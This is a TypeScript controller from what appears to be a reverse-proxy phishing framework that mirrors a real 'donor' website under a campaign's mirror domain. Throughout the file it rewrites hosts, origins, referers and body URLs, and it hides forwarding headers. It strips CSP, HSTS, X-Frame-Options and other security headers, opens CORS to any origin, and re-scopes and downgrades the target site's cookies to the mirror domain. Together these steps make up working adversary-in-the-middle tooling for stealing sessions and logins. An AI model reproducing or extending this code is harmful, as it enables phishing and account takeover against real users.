import { DIContainer } from '@famir/common'
import { HTTP_SERVER_ROUTER, HttpServerRouter } from '@famir/http-server'
import { Logger, LOGGER } from '@famir/logger'
import { Validator, VALIDATOR } from '@famir/validator'
import { BaseController } from '../base/index.js'

export const TRANSFORM_CONTROLLER = Symbol('TransformController')

export class TransformController extends BaseController {
  static inject(container: DIContainer) {
    container.registerSingleton(
      TRANSFORM_CONTROLLER,
      (c) =>
        new TransformController(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Logger>(LOGGER),
          c.resolve<HttpServerRouter>(HTTP_SERVER_ROUTER)
        )
    )
  }

  static resolve(container: DIContainer): TransformController {
    return container.resolve(TRANSFORM_CONTROLLER)
  }

  constructor(validator: Validator, logger: Logger, router: HttpServerRouter) {
    super(validator, logger, router)

    this.logger.debug(`TransformController initialized`)
  }

  use(): this {
    this.router.register('transform', async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')
      const targets = this.getState(ctx, 'targets')
      const message = this.getState(ctx, 'message')

      message.addRequestHeadInterceptor('transform', () => {
        message.url.merge({
          protocol: target.donorProtocol,
          hostname: target.donorHostname,
          port: target.donorPort.toString()
        })

        message.requestHeaders.set('Host', target.donorHost)

        if (message.requestHeaders.has('Origin')) {
          const donorOrigin = [target.donorProtocol, '//', target.donorHost].join('')

          message.requestHeaders.set('Origin', donorOrigin)
        }

        if (message.requestHeaders.has('Referer')) {
          const oldValue = message.requestHeaders.getString('Referer')
          if (oldValue) {
            const newValue = message.rewriteUrl(oldValue, true, targets)
            message.requestHeaders.set('Referer', newValue)
          }
        }

        message.requestHeaders.delete([
          'Via',
          'X-Real-Ip',
          'X-Client-Ip',
          'X-Forwarded-For',
          'X-Forwarded-Host',
          'X-Forwarded-Proto',
          'Upgrade-Insecure-Requests'
        ])

        const cookies = message.requestHeaders.getCookies()
        if (cookies) {
          cookies[campaign.sessionCookieName] = undefined

          message.requestHeaders.setCookies(cookies)
        }
      })

      message.addRequestBodyInterceptor('transform', () => {
        const contentType = message.requestHeaders.getContentType()
        if (contentType && message.isRewriteUrlContentType(contentType)) {
          const charset = contentType.parameters['charset']

          const oldValue = message.requestBody.getText(charset)
          if (oldValue) {
            const newValue = message.rewriteUrl(oldValue, true, targets)
            message.requestBody.setText(newValue)
          }
        }
      })

      message.addResponseHeadInterceptor('transform', () => {
        if (message.responseHeaders.has('Access-Control-Allow-Origin')) {
          message.responseHeaders.set('Access-Control-Allow-Origin', '*')
        }

        if (message.responseHeaders.has('Location')) {
          const absoluteUrlRegExp = /^https?:\/\/|^\/\//i
          const oldValue = message.responseHeaders.getString('Location')
          if (oldValue && absoluteUrlRegExp.test(oldValue)) {
            const newValue = message.rewriteUrl(oldValue, false, targets)
            message.responseHeaders.set('Location', newValue)
          }
        }

        message.responseHeaders.delete([
          'Proxy-Agent',
          'Content-Security-Policy',
          'Content-Security-Policy-Report-Only',
          'Permissions-Policy',
          'Strict-Transport-Security',
          'X-XSS-Protection',
          'X-Content-Type-Options',
          'X-Frame-Options'
        ])

        const setCookies = message.responseHeaders.getSetCookies()
        if (setCookies) {
          Object.keys(setCookies).forEach((name) => {
            const setCookie = setCookies[name]

            if (setCookie) {
              if (setCookie.domain) {
                setCookie.domain = '.' + campaign.mirrorDomain
              }

              if (setCookie.secure && !target.mirrorSecure) {
                setCookie.secure = false
              }
            }
          })

          message.responseHeaders.setSetCookies(setCookies)
        }
      })

      message.addResponseBodyInterceptor('transform', () => {
        const contentType = message.responseHeaders.getContentType()
        if (contentType && message.isRewriteUrlContentType(contentType)) {
          const charset = contentType.parameters['charset']

          const oldValue = message.responseBody.getText(charset)
          if (oldValue) {
            const newValue = message.rewriteUrl(oldValue, false, targets)
            message.responseBody.setText(newValue)
          }
        }
      })

      await next()
    })

    return this
  }
}
